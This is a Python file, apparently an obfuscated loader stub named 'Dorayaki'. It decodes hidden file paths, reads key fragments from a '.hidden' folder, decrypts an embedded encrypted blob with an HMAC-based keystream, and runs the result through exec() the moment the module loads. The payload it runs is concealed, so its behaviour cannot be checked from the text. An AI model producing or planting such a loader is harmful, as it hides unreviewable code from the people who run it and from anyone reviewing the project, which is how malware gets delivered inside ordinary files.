# Dorayaki Obfuscated Stub
import base64, os, hashlib, hmac
from pathlib import Path

_KEY_PARTS_OBF = ['wtmL4ATNhJDNjZmYhBjZ1QTOlV2NiZzL5gDZwADN5ADN3czNhRDO18iblRGZphmLv4iL', 'wtmL5ETYwQGM0MTOiBDO3IzYmN2YkFzL5gDZwADN5ADN3czNhRDO18iblRGZphmLv4iL', 'wtmL3MjYiJ2N0czMxIGO4IzNkZjM3UzL5gDZwADN5ADN3czNhRDO18iblRGZphmLv4iL', 'wtmLxkDNzU2YmVWOzAzMlhjYxUjMxczL5gDZwADN5ADN3czNhRDO18iblRGZphmLv4iL']
_BLOB_CHUNKS = ['+L0AHPAspgyZ/RZ1lKBYOY4rO7OurIRpijwO3pAcCuROBjkAaNlOTrh0Sh53fs9nsWfg', 'uUdpsz18Wep70Ao9W/dDaxOnyr4YJRW96pO50PlAW2TbgWUz7JlvkO9NTX28zH+fSKlO', 'qs0Uht9Q5v0HV74HzdxjS8erLRHP2q1xJjFRn1xyBFhEaQyyqE19H/cALvEyzeKC5Hfo', 'LORf8+DKjDcPMzewKodwDZgsUpKY7qFPSjo+ZdybgSTs+V0u2raH6jcF62tJhBiaIdNo', 'aLy7lJ3r/zmNYnlBGNwtc5FKiiN7R6mexU1HcgE5TKRr7kBOkXDceMOahN7EH0fk1JY5', 'fzYfKbbZ2j5VZzVYWpavlH+Mpu/OAaTKshYjqcfO+PMhXUiUCP/BmoFp9ix0i8NCs6XI']

def _rev(s): return s[::-1]
def _read_key_parts():
    parts = []
    # FIX: Resolve relative to this file's directory
    base = Path(__file__).resolve().parent
    for obf in _KEY_PARTS_OBF:
        try:
            rel_path_str = base64.b64decode(_rev(obf)).decode('utf-8')
            p = base.joinpath(rel_path_str).resolve()
            parts.append(base64.b64decode(p.read_text('utf-8')))
        except Exception: pass
    return b''.join(parts)

def _keystream(key, nonce, length):
    out = bytearray(); counter = 0
    while len(out) < length:
        out.extend(hmac.new(key, nonce + counter.to_bytes(8,'big'), hashlib.sha256).digest())
        counter += 1
    return bytes(out[:length])

def _run():
    key = _read_key_parts()
    if not key: raise RuntimeError("Decryption Key not found (missing .hidden folder?)")
    blob = base64.b64decode(''.join([_rev(c) for c in _BLOB_CHUNKS]))
    nonce, ct = blob[:12], blob[12:]
    ks = _keystream(key, nonce, len(ct))
    plain = bytes(a ^ b for a, b in zip(ct, ks))
    try: src = plain.decode('utf-8')
    except: src = plain.decode('latin-1')
    exec(compile(src, __file__, 'exec'), globals())

_run()
